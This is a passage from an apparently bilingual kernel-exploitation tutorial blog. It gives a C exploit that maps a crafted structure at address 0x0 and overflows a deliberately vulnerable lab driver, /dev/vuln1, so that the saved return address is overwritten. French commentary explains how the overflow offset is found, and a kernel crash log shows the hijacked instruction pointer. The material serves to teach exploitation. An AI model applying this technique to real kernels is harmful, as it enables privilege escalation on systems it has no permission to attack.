</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/stat.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/mman.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;assert.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/ioctl.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#75715e">/* 
</span><span style="color:#75715e">*  exploit.c
</span><span style="color:#75715e">*  author: nasm 
</span><span style="color:#75715e">*/</span>
  
<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> write_buf {
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> length;
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>rbuf;
} wr_struct;

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {

    <span style="color:#66d9ef">int</span> fd;
    wr_struct to_send <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>}; 
    <span style="color:#75715e">/* The basic structure we send (we need to setup only to_send.length) */</span>
    wr_struct <span style="color:#f92672">*</span>struct_nullp <span style="color:#f92672">=</span> NULL; 
    <span style="color:#75715e">/* The structure we are crafting at 0x0 from userland */</span>
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>pld <span style="color:#f92672">=</span> NULL; 
    <span style="color:#75715e">/* A pointer toward the location which will overflow the vuln1_write&#39;s saved rip */</span>

    <span style="color:#66d9ef">if</span> ((fd <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/dev/vuln1&#34;</span>, O_RDWR)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x0</span>) {
        printf(<span style="color:#e6db74">&#34;Error open</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
    }

    to_send.length <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x10</span>; 
    <span style="color:#75715e">/* must be lower than LEN_MAX */</span>

    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>null_pointer <span style="color:#f92672">=</span> mmap(<span style="color:#ae81ff">0x0</span>, <span style="color:#ae81ff">1024</span>, PROT_READ <span style="color:#f92672">|</span> PROT_WRITE , 
    MAP_FIXED <span style="color:#f92672">|</span> MAP_PRIVATE <span style="color:#f92672">|</span> MAP_ANONYMOUS , <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x0</span>);

    struct_nullp <span style="color:#f92672">=</span> (wr_struct <span style="color:#f92672">*</span>)null_pointer;
    <span style="color:#75715e">/* Easier to handle with the fields of a struct and not raw offsets */</span> 

    struct_nullp<span style="color:#f92672">-&gt;</span>length <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x28</span><span style="color:#f92672">+</span><span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>); 
    <span style="color:#75715e">/* 
</span><span style="color:#75715e">    *  crash from 0x28 bytes to which we add the length of the 
</span><span style="color:#75715e">    *  pointer we want to erase (saved rip) 
</span><span style="color:#75715e">    */</span>

    struct_nullp<span style="color:#f92672">-&gt;</span>rbuf <span style="color:#f92672">=</span> malloc(<span style="color:#ae81ff">0x28</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x8</span>);
    <span style="color:#75715e">/* Same than for the length */</span>

    pld <span style="color:#f92672">=</span> struct_nullp<span style="color:#f92672">-&gt;</span>rbuf<span style="color:#f92672">+</span><span style="color:#ae81ff">0x28</span>;
    <span style="color:#75715e">/*
</span><span style="color:#75715e">    *  Handle directly the address from which the saved rip will be overwritten
</span><span style="color:#75715e">    */</span>

    <span style="color:#f92672">*</span>pld <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>)<span style="color:#ae81ff">0x1337</span>;
    <span style="color:#75715e">/*
</span><span style="color:#75715e">    *  Invalid pointer which will leads to a crash but interesting pattern
</span><span style="color:#75715e">    */</span>

    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">==</span> write(fd, <span style="color:#f92672">&amp;</span>to_send, to_send.length)) {
        printf(<span style="color:#e6db74">&#34;[Error sending pld]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
    }

    printf(<span style="color:#e6db74">&#34;[pld send]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);

    close(fd);
    free(struct_nullp<span style="color:#f92672">-&gt;</span>rbuf);

    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">==</span> munmap(null_pointer, <span style="color:#ae81ff">1024</span>)) {
      <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
    }

    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>Je ne commenterai pas tout le code, seulement les parties les plus importantes, nous devons mettre en place deux structures : la première pour atteindre le contrôle sur le champ <code>argp-&gt;length</code> et la seconde mappée en 0x0, elle écrasera la „stack frame“ de la stack de la fonction cible en créant la même structure wr_struct et en mettant les champs length et rbuf pour écraser le rip sauvegardé et rediriger le control flow. Pour ce faire, nous devons savoir à partir de quel offset rip est écraser. À ce titre, il convient de jeter un coup d&rsquo;œil sur l&rsquo;assembleur de la fonction <code>vuln1_write</code> produite par gcc avec IDA:</p>

  <img src="/IDA_main_asm.PNG"  alt="IDA"  class="left"  style="margin-left: auto; margin-right: auto"  />


<p>Il n&rsquo;est pas nécessaire de commenter tout le code assembleur, mais vous remarquerez peut-être quelque chose, l&rsquo;opérande ds:vuln1_ioctl dans IDA signifie 0x0 (parce que l&rsquo;adresse de reloc de vuln1_ioctl est zéro). Le compilateur n&rsquo;a pas initialisé le pointeur de structure initial (en rsi) à zéro mais a optimisé les deux champs pour qu&rsquo;ils soient directement à l&rsquo;adresse 0x0(base)+0x0(offset dans la structure) pour la longueur et à l&rsquo;adresse 0x0(base)+0x8(offset de rbuf dans la structure, le champ de longueur est un unsigned long) pour buf (loc_5+3=8). La partie intéressante est pour nous seulement le prologue et l&rsquo;épilogue de la fonction, tout d&rsquo;abord elle push trois registres et alloue 0x10 octets pour les variables locales, et si nous voulons être sûr de savoir à partir de quel offset rip est écrasé, nous pouvons regarder l&rsquo;épilogue où il détruira juste les allocations précédentes. Ainsi, l&rsquo;instruction sauvegardée est écrasée de 3 * 8 + 0x10 (trois registres + l&rsquo;espace pour les variables locales), ce qui nous donne 40 ou 0x28. Maintenant que nous disposons de cette précieuse information, nous devons utiliser mmap pour mapper notre structure en 0x0. Pour cela, nous utilisons l&rsquo;argument <code>MAP_FIXED</code> qui nous permet de mapper certaines pages à une adresse virtuelle particulière. En 0x0, nous commençons à élaborer notre structure en mettant le champ de longueur à 0x28+8 pour ne déborder que le saved rip. Ensuite, nous prenons un pointeur vers les octets qui écraseront le saved rip pour les initialiser à 0x1337 (joli pattern (: ). Il ne nous reste plus qu&rsquo;à compiler l&rsquo;exploit et à le lancer, et comme nous le voyons ci-dessous, nous obtenons un crash avec un beau rip invalide 😀.</p>
<pre><code>[ 5398.893290] BUG: unable to handle kernel paging request at 0000000000001337
[ 5398.893590] PGD 8000000043111067 P4D 8000000043111067 PUD 4617b067 PMD 43771067 PTE 0
[ 5398.893713] Oops: 0010 [#5] SMP PTI
[ 5398.893818] CPU: 0 PID: 1317 Comm: exploit Tainted: G      D    OE     4.19.0-8-amd64 #1 Debian 4.19.98-1
[ 5398.894229] Hardware name: innotek GmbH VirtualBox/VirtualBox, BIOS VirtualBox 12/01/2006
[ 5398.894438] RIP: 0010:0x1337
[ 5398.894662] Code: Bad RIP value.
[ 5398.894933] RSP: 0018:ffffc9000064fed8 EFLAGS: 00010286
[ 5398.895153] RAX: 0000000000000000 RBX: 0000000000000000 RCX: 0000000000000006
[ 5398.895463] RDX: 0000000000000000 RSI: 0000000000000082 RDI: ffff88804a6166b0
[ 5398.895673] RBP: 0000000000000000 R08: 00000000000005eb R09: 0000000000aaaaaa
[ 5398.896001] R10: 0000000000000000 R11: ffffc9000109f020 R12: 0000000000000000
[ 5398.896187] R13: ffffc9000064ff08 R14: 00007ffd164b6020 R15: 0000000000000000
[ 5398.896395] FS:  00007fc6ae32a500(0000) GS:ffff88804a600000(0000) knlGS:0000000000000000
[ 5398.896599] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 5398.896809] CR2: 000000000000130d CR3: 0000000034140002 CR4: 00000000000206f0
[ 5398.897033] Call Trace:
[ 5398.897261]  ? ksys_write+0x57/0xd0
[ 5398.897512]  ? do_syscall_64+0x53/0x110
[ 5398.897749]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9
</code></pre><h1 id="summary">Summary<a href="#summary" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>To summarize we&rsquo;ve cover only the basics and we advice you to take a look at the links section. We have only seen how to trigger vulns like buffer overflows, off by one/two, NULL pointer dereferences &hellip; That are very basics vulnerabilities and for more advanced subjects you can look at the articles. If you have questions, please join my discord server or dm me on twitter.</p>
<p>Special thanks to sensei  and  for technical advices and to <a href="https://github.com/medievalghoul">@medievalghoul</a> for reviewing the english !!</p>
<p>~ cheers, nasm</p>
<p>Pour résumer, nous n&rsquo;avons couvert que l&rsquo;essentiel et nous vous conseillons de consulter la section des liens. Nous avons seulement vu comment déclencher des vulnérabilisées comme des buffer overflow, NULL pointer dereference &hellip; Ce sont des vulnérabilités très basiques et pour les sujets plus avancés, vous pouvez consulter les autres articles. Si vous avez des questions, veuillez rejoindre mon serveur Discord ou me DM sur Twitter.</p>
<p>Remerciements particuliers au sensai <a href="https://m101.github.io/">@m_101</a> et <a href="http://aassfxxx.infos.st/">@aassfxxx</a> pour les avis techniques, à <a href="https://github.com/medievalghoul">@medievalghoul</a> pour la révision de la version anglaise et MorpheusH3x pour la version française !!</p>
<p>~ cheers, nasm</p>

      </div></div>

  

  

</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright copyright--user">
        <span>© linKERN Emporium 2021</span>
    
        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
      </div>
  </div>
</footer>

<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>


  <script src="/assets/languageSelector.js"></script>






  
</div>

</body>
</html>
